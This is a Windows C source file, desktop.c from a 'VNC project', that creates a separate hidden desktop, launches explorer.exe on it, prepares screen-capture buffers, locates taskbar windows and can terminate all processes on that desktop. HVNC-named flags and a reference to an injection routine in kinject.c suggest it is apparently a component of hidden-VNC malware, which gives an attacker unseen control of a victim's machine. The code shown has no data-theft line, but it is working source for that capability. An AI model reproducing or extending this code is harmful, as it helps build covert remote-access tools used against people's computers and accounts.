//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: desktop.c
// $Revision: 198 $
// $Date: 2014-07-14 20:01:15 +0400 (Пн, 14 июл 2014) $
// description: 
//	creating and initializing vnc desktop

#include "project.h"

#include "scr.h"
#include "bmp.h"
#include "desktop.h"

// from kinject.c
WINERROR KInjectRegisterExplorer(VOID);


// creates new desktop
DWORD CreateNewDesktop ( PVNC_SESSION pSession, PTCHAR DeskName, int DeskNameLength, OUT PPIXEL_FORMAT LocalPixelFormat )
{
	DWORD dwError = NO_ERROR;
	HDESK hDesktop;
	PRFB_SESSION RfbSession = pSession->RfbSession;

	HDC hDC;

	// get desktop detentions
	int dwHeight;
	int dwWidth;

	WORD bBytesPerPixel,bBitsPerPixel;
	DWORD dwScreenBufferSize;

	// get screen buffer size
	do{
		// create new desktop
		hDesktop = CreateDesktop(DeskName, NULL, NULL, DF_ALLOWOTHERACCOUNTHOOK, GENERIC_ALL, &g_DefaultSA);
		if ( !hDesktop ){
			dwError = GetLastError();
			break;
		}

		// get desktop params
		hDC = GetDC(NULL);
		dwHeight = GetDeviceCaps(hDC,VERTRES);
		dwWidth  = GetDeviceCaps(hDC,HORZRES);
		ReleaseDC(NULL,hDC);

		// get device pixel format
		BmpGetPixelFormat ( &pSession->Desktop.BmInfo, LocalPixelFormat, dwHeight, dwWidth );

		bBitsPerPixel  = LocalPixelFormat->BitsPerPixel;
		bBytesPerPixel = bBitsPerPixel/8;

		dwScreenBufferSize = 
			(bBytesPerPixel * dwHeight * dwWidth);

		if (dwScreenBufferSize < 0){
			dwScreenBufferSize*=-1;
		}

		if (dwScreenBufferSize & 0xF){
			dwScreenBufferSize = (dwScreenBufferSize & ~0xF)+0x10;
		}
		
		lstrcpy ( pSession->Desktop.Name, DeskName );
		pSession->Desktop.hDesktop   = hDesktop;
		pSession->Desktop.NameLength = DeskNameLength;
		pSession->Desktop.dwFlags    = 0;// | HVNC_NO_WINDOWS_MANIPULATION_TRICK | HVNC_NO_WNDHOOK;

		pSession->Desktop.dwHeight = dwHeight;
		pSession->Desktop.dwWidth = dwWidth;

		// init pixel format
		pSession->Desktop.bBitsPerPixel      = bBitsPerPixel;
		pSession->Desktop.bBytesPerPixel     = bBytesPerPixel;
		pSession->Desktop.dwScreenBufferSize = dwScreenBufferSize;
		pSession->Desktop.dwWidthInBytes     = dwWidth * bBytesPerPixel;

	} while ( FALSE );

	if ( dwError != NO_ERROR ){
		if ( hDesktop ){
			CloseDesktop( hDesktop );
		}
	}

	return dwError;
}

DWORD DeskInitIntermedDC( PVNC_DESKTOP pDesktop,HDC hTmpDC, BOOL bClient )
{
	HDC hDC=hTmpDC;
	DWORD dwError = NO_ERROR;

	if (!hTmpDC){
		hDC = GetDC(NULL);
	}

	if (pDesktop->hIntermedMemDC)
	{
		SelectObject(pDesktop->hIntermedMemDC,pDesktop->hIntermedOldBitmap);
		DeleteObject(pDesktop->hIntermedMemBitmap);
		DeleteDC(pDesktop->hIntermedMemDC);
	}

	do{
		if ( ( pDesktop->hIntermedMemDC = CreateCompatibleDC(hDC) ) == NULL ){
			dwError = GetLastError();
			break;
		}
		if ( ( pDesktop->hIntermedMemBitmap = 
				BmpCreateDibSection(
					pDesktop->hIntermedMemDC,
					&pDesktop->BmInfo,
					&pDesktop->lpIntermedDIB) ) == NULL )
		{
			dwError = GetLastError();
			break;
		}
		pDesktop->hIntermedOldBitmap = (HBITMAP)SelectObject(pDesktop->hIntermedMemDC,(HGDIOBJ)pDesktop->hIntermedMemBitmap);

		//if (!bClient)
		{
			if (pDesktop->hTmpIntermedMemDC)
			{
				SelectObject(pDesktop->hTmpIntermedMemDC,pDesktop->hTmpIntermedOldBitmap);
				DeleteObject(pDesktop->hTmpIntermedMemBitmap);
				DeleteDC(pDesktop->hTmpIntermedMemDC);
			}
			if ( ( pDesktop->hTmpIntermedMemDC = CreateCompatibleDC(hDC) ) == NULL ){
				dwError = GetLastError();
				break;
			}
			if ( ( pDesktop->hTmpIntermedMemBitmap = CreateCompatibleBitmap(hDC,pDesktop->dwWidth,pDesktop->dwHeight) ) == NULL ){
				dwError = GetLastError();
				break;
			}
			pDesktop->hTmpIntermedOldBitmap = (HBITMAP)SelectObject(pDesktop->hTmpIntermedMemDC,(HGDIOBJ)pDesktop->hTmpIntermedMemBitmap);
		}
	}while ( FALSE );

	if ( dwError != NO_ERROR ){
		if ( pDesktop->hTmpIntermedOldBitmap ){
			SelectObject(pDesktop->hTmpIntermedMemDC,pDesktop->hTmpIntermedOldBitmap);
			pDesktop->hTmpIntermedOldBitmap = NULL;
		}
		if ( pDesktop->hTmpIntermedMemBitmap ){
			DeleteObject( pDesktop->hTmpIntermedMemBitmap );
			pDesktop->hTmpIntermedMemBitmap = NULL;
		}
		if ( pDesktop->hTmpIntermedMemDC ){
			DeleteDC( pDesktop->hTmpIntermedMemDC );
			pDesktop->hTmpIntermedMemDC = NULL;
		}

		if ( pDesktop->lpIntermedDIB ){
			//hFree ( pDesktop->lpIntermedDIB );
			pDesktop->lpIntermedDIB = NULL;
		}
		if ( pDesktop->hIntermedOldBitmap ){
			SelectObject(pDesktop->hIntermedMemDC,pDesktop->hIntermedOldBitmap);
			pDesktop->hIntermedOldBitmap = NULL;
		}
		if ( pDesktop->hIntermedMemBitmap ){
			DeleteObject( pDesktop->hIntermedMemBitmap );
			pDesktop->hIntermedMemBitmap = NULL;
		}
		if ( pDesktop->hIntermedMemDC ){
			DeleteDC( pDesktop->hIntermedMemDC );
			pDesktop->hIntermedMemDC = NULL;
		}
	}

	if (!hTmpDC){
		ReleaseDC(NULL,hDC);
	}
	return dwError;
}

DWORD DeskInitDCs( PVNC_DESKTOP pDesktop )
{
	HDC hDC;
	DWORD dwError = NO_ERROR;

	do{
		if ( pDesktop->hCompDC )
		{
			SelectObject(pDesktop->hCompDC,pDesktop->hOldBitmap);
			DeleteObject(pDesktop->hBitmap);
			DeleteDC(pDesktop->hCompDC);
			SelectObject(pDesktop->hTmpCompDC,pDesktop->hTmpOldBitmap);
			DeleteObject(pDesktop->hTmpBitmap);
			DeleteDC(pDesktop->hTmpCompDC);
		}

		hDC = pDesktop->hDC = GetDC(NULL);
		if ( ( pDesktop->hCompDC = CreateCompatibleDC(hDC) ) == NULL ){
			dwError = GetLastError();
			break;
		}
		if ( ( pDesktop->hTmpCompDC = CreateCompatibleDC(hDC) ) == NULL ){
			dwError = GetLastError();
			break;
		}
		if ( ( pDesktop->hTmpBitmap = CreateCompatibleBitmap(hDC,pDesktop->dwWidth,pDesktop->dwHeight) ) == NULL ){
			dwError = GetLastError();
			break;
		}
		pDesktop->hTmpOldBitmap = (HBITMAP)SelectObject(pDesktop->hTmpCompDC,pDesktop->hTmpBitmap);

		if ( ( pDesktop->hBitmap = 
			BmpCreateDibSection(
				pDesktop->hCompDC,
				&pDesktop->BmInfo,
				(void **)&pDesktop->FrameBuffer) ) == NULL )
		{
			dwError = GetLastError();
			break;
		}
		pDesktop->hOldBitmap=(HBITMAP)SelectObject(pDesktop->hCompDC,pDesktop->hBitmap);

		// update DC pallete
		BmpSetPalette(hDC,pDesktop->hBitmap,&pDesktop->BmInfo);

		dwError = DeskInitIntermedDC(pDesktop,hDC,FALSE);

	} while ( FALSE );

	if ( dwError != NO_ERROR ){

		if ( pDesktop->hOldBitmap ){
			SelectObject(pDesktop->hCompDC,pDesktop->hOldBitmap);
			pDesktop->hOldBitmap = NULL;
		}
		if ( pDesktop->FrameBuffer ){
			//hFree ( pDesktop->FrameBuffer );
			pDesktop->FrameBuffer = NULL;
		}
		if ( pDesktop->hBitmap){
			DeleteObject( pDesktop->hBitmap );
			pDesktop->hBitmap = NULL;
		}

		if ( pDesktop->hTmpOldBitmap ){
			SelectObject(pDesktop->hTmpCompDC,pDesktop->hTmpOldBitmap);
			pDesktop->hTmpOldBitmap = NULL;
		}

		if ( pDesktop->hTmpBitmap){
			DeleteObject( pDesktop->hTmpBitmap );
			pDesktop->hTmpBitmap = NULL;
		}
		if ( pDesktop->hTmpCompDC ){
			DeleteDC( pDesktop->hTmpCompDC );
			pDesktop->hTmpCompDC = NULL;
		}
		if ( pDesktop->hCompDC ){
			DeleteDC( pDesktop->hCompDC );
			pDesktop->hCompDC = NULL;
		}
	}
	return dwError;
}

DWORD DeskInitScreen(PVNC_SESSION pSession)
{
	PVNC_DESKTOP pDesktop = &pSession->Desktop;
	WORD bBytesPerPixel = pDesktop->bBytesPerPixel;
	WORD bBitsPerPixel = pDesktop->bBitsPerPixel;
	int dwHeight = pDesktop->dwHeight;
	int dwWidth  = pDesktop->dwWidth;
	int dwScreenBufferSize = pDesktop->dwScreenBufferSize;
	int dwChsumsLen;
	DWORD dwError = NO_ERROR;

	do {
		if (pDesktop->lpChecksums){
			hFree(pDesktop->lpChecksums);
		}
		dwChsumsLen=(((dwWidth+40)*(dwHeight+40))/BLOCK_SIZE)*sizeof(DWORD);
		pDesktop->lpChecksums = (DWORD*)hAlloc(dwChsumsLen);
		if ( pDesktop->lpChecksums == NULL ){
			dwError = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}
		memset(pDesktop->lpChecksums,0xFF,dwChsumsLen);

		SS_GET_DATA(pSession)->dwWidth       = dwWidth;
		SS_GET_DATA(pSession)->dwHeight      = dwHeight;
		SS_GET_DATA(pSession)->bBitsPerPixel   = pDesktop->bBitsPerPixel;
	}while ( FALSE );

	if ( dwError != NO_ERROR ){

		if ( pDesktop->lpChecksums ){
			hFree ( pDesktop->lpChecksums );
			pDesktop->lpChecksums = NULL;
		}
	}
	return dwError;
}

WINERROR DeskStartShell( PVNC_DESKTOP pDesktop )
{
	WINERROR Status = NO_ERROR;
	LPSTR szPath = NULL;
	STARTUPINFOA	Si = {0};

	UINT PathLength = GetSystemWindowsDirectoryA(NULL,0);

	if ( PathLength == 0 ){
		return ERROR_UNSUCCESSFULL;
	}

	if ( szPath = hAlloc( PathLength + sizeof("\\") + cstrlenA(szExplorer)+sizeof(CHAR)) )
	{
		GetSystemWindowsDirectoryA(szPath,PathLength);
		szPath[PathLength] = '\0';
		strcat(szPath,"\\" szExplorer );

		Si.cb = sizeof(STARTUPINFOA);
		Si.lpDesktop = pDesktop->Name;

		// Creating the shell process
		if (!AdCreateProcessA(NULL, szPath, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, &Si, &pDesktop->ShellInfo))
		{
			Status = GetLastError();
		}
		else
		{
			// Shell process successfully created, closing process and thread handles.
			CloseHandle(pDesktop->ShellInfo.hThread);
			CloseHandle(pDesktop->ShellInfo.hProcess);
			ASSERT(Status == NO_ERROR);
		}
	}	// if ( szPath = hAlloc(
	else
	{
		Status = ERROR_NOT_ENOUGH_MEMORY;
	}
	return Status;
}

//initialize desktop structures
DWORD DeskInitailize ( PVNC_SESSION pSession )
{
	DWORD dwError = NO_ERROR;
	PVNC_DESKTOP pDesktop = &pSession->Desktop;
	DWORD dwVNCMessage;

	STARTUPINFO	Si = {0};
	HWND		ShellWnd;
	int			i = 0;

	DWORD SystemVersion = GetVersion();
	CHAR SystemMajor = LOBYTE(LOWORD(SystemVersion));
	CHAR SystemMinor = HIBYTE(LOWORD(SystemVersion));

	do{
		// save thread's desktop
		pDesktop->MgmntThreadID = GetCurrentThreadId();
		pDesktop->MgmntDesktop  = GetThreadDesktop(pDesktop->MgmntThreadID);
		//	Setting new desktop to the current thread
		if (!SetThreadDesktop(pDesktop->hDesktop)){
			dwError = GetLastError();
			break;
		}

		// register servicing message
		dwVNCMessage = RegisterWindowMessageA(pDesktop->Name);
		if (!dwVNCMessage){
			dwError = GetLastError();
			break;
		}

		// save shared flags
		SS_GET_DATA(pSession)->dwDeskFlags = pDesktop->dwFlags;
		SS_GET_DATA(pSession)->dwVNCMessage = dwVNCMessage;

		//TEST
		SS_GET_DATA(pSession)->bAutodectLayout = TRUE;

		// init DCs for drawing
		dwError = DeskInitDCs ( pDesktop );
		if ( dwError != NO_ERROR ){
			break;
		}

		// init screen structures
		dwError = DeskInitScreen(pSession);
		if ( dwError != NO_ERROR ){
			break;
		}

		// start shell process
		dwError = DeskStartShell(pDesktop);
		if ( dwError != NO_ERROR ){
			break;
		}

		// save shell pid
		SS_GET_DATA(pSession)->dwExplorersPID = pDesktop->ShellInfo.dwProcessId;


		// Getting our shell window
		for ( i = 0; i < 200; i ++ ){
			ShellWnd = SS_GET_DATA(pSession)->hShellWnd;
			if ( ShellWnd ){
				break;
			}
			Sleep(100);
		}

		if ( !ShellWnd ){
			DbgPrint("Shell start timeout :( \n");
			dwError = ERROR_UNSUCCESSFULL;
			break;
		}

		pDesktop->hDeskWnd  = GetDesktopWindow();
		pDesktop->hShellWnd = ShellWnd;

		// find all system windows
		i = 0;
		while (!pDesktop->hTrayWnd && i < 10 ){
			pDesktop->hTrayWnd=FindWnd(NULL,_T("Shell_TrayWnd"),NULL);
			if ( !pDesktop->hTrayWnd ){
				Sleep( 100 );
			}
			i ++;
		}

		pDesktop->hTakSwRebarWnd    = FindWnd(pDesktop->hTrayWnd,_T("ReBarWindow32"),NULL);
		pDesktop->hTakSwWnd         = FindWnd(pDesktop->hTakSwRebarWnd,_T("MSTaskSwWClass"),NULL);
		pDesktop->hToolBarWnd       = FindWnd(pDesktop->hTakSwWnd,_T("ToolbarWindow32"),NULL);
		pDesktop->hMSTaskListWnd    = FindWnd(pDesktop->hTakSwWnd,_T("MSTaskListWClass"),NULL);
		pDesktop->hTrayNotifyWnd    = FindWnd(pDesktop->hTrayWnd,_T("TrayNotifyWnd"),NULL);
		pDesktop->hTraySystemNotifyToolbarWnd = FindWnd(pDesktop->hTrayNotifyWnd,_T("ToolbarWindow32"),NULL);
		pDesktop->hSysPagerWnd                = FindWnd(pDesktop->hTrayNotifyWnd,_T("SysPager"),NULL);
		pDesktop->hTrayUserNotifyToolbarWnd   = FindWnd(pDesktop->hSysPagerWnd,_T("ToolbarWindow32"),NULL);
		pDesktop->hOverflowIconWindow         = FindWnd(NULL,_T("NotifyIconOverflowWindow"),NULL);
		pDesktop->hTrayUserNotifyOverflowToolbarWnd = FindWnd(pDesktop->hOverflowIconWindow,_T("ToolbarWindow32"),NULL);

		if (IsXP()){
			pDesktop->hStartBtnWnd = GetWindow(pDesktop->hTrayWnd,GW_CHILD);
		}else if (IsVISTA() || IsWin7()){
			pDesktop->hStartBtnWnd = FindWnd(NULL,_T("Button"),_T("Start"));
		}else if ( IsWIN8andAbove() ){
			pDesktop->hStartBtnWnd = FindWnd(pDesktop->hTrayWnd,_T("Start"),_T("Start"));
		}

		pDesktop->hStartMenuWnd = FindWnd(NULL,_T("DV2ControlHost"),_T("Start menu"));
		pDesktop->hProgmanWnd   = FindWnd(NULL,_T("Progman"),_T("Program Manager"));
		pDesktop->hDefView      = FindWnd(pDesktop->hProgmanWnd,_T("SHELLDLL_DefView"),NULL);
		pDesktop->hDeskListView = FindWnd(pDesktop->hDefView,_T("SysListView32"),_T("FolderView"));

		// tell shell to update(disable) visual effects
		SendMessage(
			ShellWnd,
			WM_SETTINGCHANGE,
			(WPARAM)0,(LPARAM)"VisualEffects"
			);

	} while ( FALSE );

	if ( dwError != NO_ERROR ){
		DeskRelease( pDesktop );
	}

	return dwError;
}

DWORD DeskInitializeClient( PVNC_DESKTOP pDesktop, PVNC_SHARED_SECTION VncSharedSection )
{
	DWORD Status;
	DWORD dwDeskFlags;
	DWORD dwHeight,dwWidth;
	WORD  bBitsPerPixel;

	WORD bBytesPerPixel;
	DWORD dwScreenBufferSize;
	PIXEL_FORMAT PixelFormat;

	VncLockSharedSection( VncSharedSection );
	dwDeskFlags = VncSharedSection->Data->dwDeskFlags;
	dwHeight = VncSharedSection->Data->dwHeight;
	dwWidth = VncSharedSection->Data->dwWidth;
	bBitsPerPixel = VncSharedSection->Data->bBitsPerPixel;
	VncUnlockSharedSection( VncSharedSection );


	pDesktop->hDesktop = GetThreadDesktop(GetCurrentThreadId());
	pDesktop->hDeskWnd = GetDesktopWindow();
	pDesktop->dwFlags = dwDeskFlags;

	bBytesPerPixel = bBitsPerPixel/8;
	dwScreenBufferSize = (bBytesPerPixel * dwHeight * dwWidth);

	if (dwScreenBufferSize < 0){
		dwScreenBufferSize*=-1;
	}

	if (dwScreenBufferSize & 0xF){
		dwScreenBufferSize = (dwScreenBufferSize & ~0xF)+0x10;
	}

	pDesktop->dwHeight = dwHeight;
	pDesktop->dwWidth = dwWidth;
	pDesktop->bBitsPerPixel      = bBitsPerPixel;
	pDesktop->bBytesPerPixel     = bBytesPerPixel;
	pDesktop->dwScreenBufferSize = dwScreenBufferSize;
	pDesktop->dwWidthInBytes     = dwWidth * bBytesPerPixel;

	// init desktop name 
	lstrcpyA(pDesktop->Name,VncSharedSection->Data->DesktopName);
	pDesktop->NameLength = lstrlenA(VncSharedSection->Data->DesktopName);


	// init painting lock
	pDesktop->hPaintingMutex = CreateMutex(NULL,FALSE,NULL);
	if ( !pDesktop->hPaintingMutex ){
		return GetLastError();
	}

	BmpGetPixelFormat( 
		&pDesktop->BmInfo, 
		&PixelFormat, 
		dwHeight,
		dwWidth
		);


	// init windows painting
	Status = DeskInitIntermedDC( pDesktop, NULL, TRUE );
	if ( Status != NO_ERROR ){
		CloseHandle( pDesktop->hPaintingMutex );
		pDesktop->hPaintingMutex = NULL;
		return Status;
	}
	return NO_ERROR;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam )
{
	PVNC_DESKTOP pDesktop = (PVNC_DESKTOP)lParam;
	DWORD dwProcessId,dwThreadID;

	if ( (dwThreadID = GetWindowThreadProcessId( hwnd, &dwProcessId )) && dwProcessId != GetCurrentProcessId() )
	{
		PostMessage(hwnd,WM_CLOSE,0,0);
		PostThreadMessage(dwThreadID,WM_QUIT,0,0);
	}
	return TRUE;
}

BOOL CALLBACK EnumWindowsProc2(HWND hwnd, LPARAM lParam )
{
	PVNC_DESKTOP pDesktop = (PVNC_DESKTOP)lParam;
	DWORD dwProcessId;

	if ( GetWindowThreadProcessId( hwnd, &dwProcessId ) && dwProcessId != GetCurrentProcessId() )
	{
		HANDLE hProcess;

		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId);
		if ( hProcess ){
			TerminateProcess( hProcess, 0 );
		}
		WaitForSingleObject( hProcess, 10000 );
		CloseHandle( hProcess );
		return FALSE;
	}
	return TRUE;
}

// kills all the processes on desktop
VOID DeskCloseWindows( PVNC_DESKTOP pDesktop )
{
	if ( pDesktop->hDesktop ){
		EnumDesktopWindows( pDesktop->hDesktop, EnumWindowsProc, (LPARAM)pDesktop);
	}
}


// kills all the processes on desktop
VOID DeskKillAllProcesses( PVNC_DESKTOP pDesktop )
{
	if ( pDesktop->hDesktop ){
		EnumDesktopWindows( pDesktop->hDesktop, EnumWindowsProc, (LPARAM)pDesktop);
		while ( EnumDesktopWindows( pDesktop->hDesktop, EnumWindowsProc2, (LPARAM)pDesktop));
	}
}

VOID DeskRelease( PVNC_DESKTOP pDesktop )
{
	if ( pDesktop->MgmntThreadID == GetCurrentThreadId() ){
		if ( pDesktop->MgmntDesktop && pDesktop->MgmntDesktop != GetThreadDesktop(pDesktop->MgmntThreadID) ){
			SetThreadDesktop( pDesktop->MgmntDesktop );
		}
	}
	// free screening
	if ( pDesktop->lpChecksums ){
		hFree ( pDesktop->lpChecksums );
		pDesktop->lpChecksums = NULL;
	}

	if ( pDesktop->FrameBuffer ){
		//hFree ( pDesktop->FrameBuffer );
		pDesktop->FrameBuffer = NULL;
	}

	if ( pDesktop->hOldBitmap ){
		SelectObject(pDesktop->hCompDC,pDesktop->hOldBitmap);
		pDesktop->hOldBitmap = NULL;
	}

	if ( pDesktop->hBitmap){
		DeleteObject( pDesktop->hBitmap );
		pDesktop->hBitmap = NULL;
	}

	if ( pDesktop->hTmpOldBitmap ){
		SelectObject(pDesktop->hTmpCompDC,pDesktop->hTmpOldBitmap);
		pDesktop->hTmpOldBitmap = NULL;
	}

	if ( pDesktop->hTmpBitmap){
		DeleteObject( pDesktop->hTmpBitmap );
		pDesktop->hTmpBitmap = NULL;
	}
	if ( pDesktop->hTmpCompDC ){
		DeleteDC( pDesktop->hTmpCompDC );
		pDesktop->hTmpCompDC = NULL;
	}
	if ( pDesktop->hCompDC ){
		DeleteDC( pDesktop->hCompDC );
		pDesktop->hCompDC = NULL;
	}
	if ( pDesktop->hTmpIntermedOldBitmap ){
		SelectObject(pDesktop->hTmpIntermedMemDC,pDesktop->hTmpIntermedOldBitmap);
		pDesktop->hTmpIntermedOldBitmap = NULL;
	}
	if ( pDesktop->hTmpIntermedMemBitmap ){
		DeleteObject( pDesktop->hTmpIntermedMemBitmap );
		pDesktop->hTmpIntermedMemBitmap = NULL;
	}
	if ( pDesktop->hTmpIntermedMemDC ){
		DeleteDC( pDesktop->hTmpIntermedMemDC );
		pDesktop->hTmpIntermedMemDC = NULL;
	}

	if ( pDesktop->lpIntermedDIB ){
		//hFree ( pDesktop->lpIntermedDIB );
		pDesktop->lpIntermedDIB = NULL;
	}
	if ( pDesktop->hIntermedOldBitmap ){
		SelectObject(pDesktop->hIntermedMemDC,pDesktop->hIntermedOldBitmap);
		pDesktop->hIntermedOldBitmap = NULL;
	}
	if ( pDesktop->hIntermedMemBitmap ){
		DeleteObject( pDesktop->hIntermedMemBitmap );
		pDesktop->hIntermedMemBitmap = NULL;
	}
	if ( pDesktop->hIntermedMemDC ){
		DeleteDC( pDesktop->hIntermedMemDC );
		pDesktop->hIntermedMemDC = NULL;
	}
	if ( pDesktop->hDesktop ){
		if ( !CloseDesktop( pDesktop->hDesktop ) ){
			DbgPrint("[DeskRelease] CloseDesktop failed err=%lu\n",GetLastError());
		}
		pDesktop->hDesktop = NULL;
	}
}